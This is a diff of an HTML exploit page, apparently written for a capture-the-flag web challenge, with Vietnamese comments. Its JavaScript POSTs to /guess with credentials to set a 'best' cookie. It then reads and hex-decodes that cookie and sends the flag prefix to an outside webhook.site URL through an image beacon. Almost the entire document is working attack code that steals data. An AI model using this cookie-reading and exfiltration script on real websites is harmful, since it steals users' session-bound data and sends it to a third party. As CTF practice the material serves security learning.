@@ -1,23 +1,26 @@
-<!-- static/payload.html -->
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>Local Exploit</title></head>
-<body>
+<html><body>
 <script>
-(async () => {
-  // 1) POST /guess với một guess bất kỳ để set cookie 'best' 
+;(async () => {
+  // 1) Gửi POST /guess để set cookie best
   await fetch('/guess', {
     method: 'POST',
     credentials: 'include',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ guess: 'NHNC{', note: '' }) // khac
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({guess:'NHNC{', note:''})
   });
-  // 2) GET /inner.html để đọc best-prefix
-  const html = await fetch('/inner.html', { credentials: 'include' }).then(r=>r.text());
-  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];
-  // 3) Leak ra webhook
-  new Image().src = 'https://webhook.site/YOUR-UUID?flag='+encodeURIComponent(prefix);
+
+  // 2) Đọc cookie best ngay từ JS
+  const raw = document.cookie.split('; ').find(r=>r.startsWith('best='));
+  if (raw) {
+    const val = decodeURIComponent(raw.split('=')[1]);
+    const [hexP,] = val.split(':');
+    const prefix = hexP.match(/.{1,2}/g)
+                       .map(h=>String.fromCharCode(parseInt(h,16)))
+                       .join('');
+    // 3) Leak prefix qua webhook
+    new Image().src = 'http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(prefix);
+  }
 })();
 </script>
-</body>
-</html>
+</body></html>
